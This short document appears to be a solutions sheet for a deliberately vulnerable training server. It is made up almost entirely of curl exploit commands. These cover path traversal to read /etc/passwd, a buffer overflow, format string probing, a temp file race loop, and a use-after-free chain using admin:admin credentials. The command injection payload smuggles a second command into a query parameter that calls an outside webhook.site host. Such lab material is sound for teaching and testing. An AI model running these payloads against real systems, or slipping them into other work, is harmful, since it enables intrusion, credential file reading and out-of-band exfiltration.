### Solutions

### Path Traversal

```
curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
```

### Buffer Overflow

```
curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
```

### Command Injection 

```
example request
curl "http://127.0.0.1:8081/logs?filter=200"
```

```
command injection payload
`curl "http://127.0.0.1:8081/logs?filter=foobar%20/tmp/server.log;curl%20https://webhook.site/d5e64a1e-9c6c-4891-ae79-a79e7e9012bd%20&&%20cat"

```

### Format String Attack 

```
curl "http://127.0.0.1:8081/echo.php?input=%p%p%p"
```

### Insecure Temp File Creation 

```
curl -i http://127.0.0.1:8081/echo.php`
```

check /tmp folder to when php file is created, this can be modified
```
while true; do php_file=$(ls /tmp/php_script_*.php 2>/dev/null); if [ -n "$php_file" ]; then cat "$php_file"; break; fi; sleep 1; done
```

### Use-After-Free (Logger Config)

This vulnerability allows an attacker to manipulate the heap by allocating and freeing a logger configuration object.

1. **Allocate**: Authenticate as admin and set a custom log format.
```bash
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=set&format=heap_grooming"
```

2. **Free**: Reset the configuration. This frees the memory but leaves a dangling pointer.
```bash
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=reset"
```

3. **Trigger**: Any subsequent request will cause the server to use the dangling pointer. If the memory has been reallocated (e.g., via Base64 decoding in the Authorization header), this can lead to RCE.
```bash
curl "http://127.0.0.1:8081/"
```
